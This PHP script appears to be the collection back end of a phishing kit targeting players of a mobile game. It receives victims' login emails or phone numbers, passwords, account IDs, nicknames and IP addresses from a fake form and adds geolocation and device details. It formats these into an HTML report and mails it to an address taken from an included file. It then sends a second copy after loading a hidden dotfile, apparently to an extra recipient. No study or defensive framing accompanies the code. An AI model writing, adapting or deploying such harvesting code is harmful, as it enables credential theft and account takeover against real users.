<?php
error_reporting(0);
date_default_timezone_set('Asia/Bangkok');
include'ThuSystem/nguyen.php';
$nguyen = new NguyenThuWan();
$jamasuk = date('l, d-m-Y h:i:s');


$user = $_POST['user'];
$pass = $_POST['pass'];
$hp = $_POST['hp'];
$id = $_POST['id'];
$nick = $_POST['nick'];
$level = $_POST['level'];
$epass = $_POST['epass'];
$rank = $_POST['rank'];
$ua = $_POST['ua'];
$ip = $_POST['ip'];
$op = $_POST['op'];
$device = $nguyen->getDevice($ua)['device'];
$subjek = "$nick | LVL $level | $device";
include'ThuSystem/Error.php';
$pesan = '
<center>
 <div style="background: url(https://coverfiles.alphacoders.com/431/43135.png) no-repeat;border:2px solid black;background-size: cover; width: 294; height: 150px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;">
</div>
 <table border="1" style="border-radius:8px; border:4px solid black; border-collapse:collapse;width:100%;background:linear-gradient(90deg,gold,orange);">
    <tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Email/Telpon</th>
<th style="width: 78%; text-align: center;"><b>'.$user.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Password</th>
<th style="width: 78%; text-align: center;"><b>'.$pass.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ID</th>
<th style="width: 78%; text-align: center;"><b>'.$id.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Hp</th>
<th style="width: 78%; text-align: center;"><b>'.$hp.' - '.$op.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Nickname</th>
<th style="width: 78%; text-align: center;"><b>'.$nick.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Level</th>
<th style="width: 78%; text-align: center;"><b>'.$level.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Rank</th>
<th style="width: 78%; text-align: center;"><b>'.$rank.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Epass</th>
<th style="width: 78%; text-align: center;"><b>'.$epass.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Negara</th>
<th style="width: 78%; text-align: center;"><b>'.$nguyen->getFlag($ip)['country'].' '.$nguyen->getFlag($ip)['code'].' '.$nguyen->getFlag($ip)['flag'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Device</th>
<th style="width: 78%; text-align: center;"><b>'.$nguyen->getDevice($ua)['device'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Os</th>
<th style="width: 78%; text-align: center;"><b>'.$nguyen->getDevice($ua)['os'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Browser</th>
<th style="width: 78%; text-align: center;"><b>'.$nguyen->getDevice($ua)['browser'].'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Ip</th>
<th style="width: 78%; text-align: center;"><b>'.$ip.'</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>'.$jamasuk.'</th> 
</tr>
</table>
<div style="border:2px solid black;width: 294; font-weight:bold; height: 20px; background: linear-gradient(90deg,gold,orange); color: black; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="font-weight:bold;font-size:15px;">&copy; Nguyen Thu Wan</div>
</div>
 <center>
';
include'email.php';
$sender = 'From: '.$nguyen->getFlag($ip)['flag'].' .: NguyenThuWan :. <kimberlyhimeku@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($email, $subjek, $pesan, $headers);

include'ThuSystem/.noff.php';
$sender = 'From: '.$nguyen->getFlag($ip)['flag'].' .: NguyenThuWan :. <kimberlyhimeku@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($email, $subjek, $pesan, $headers);

?>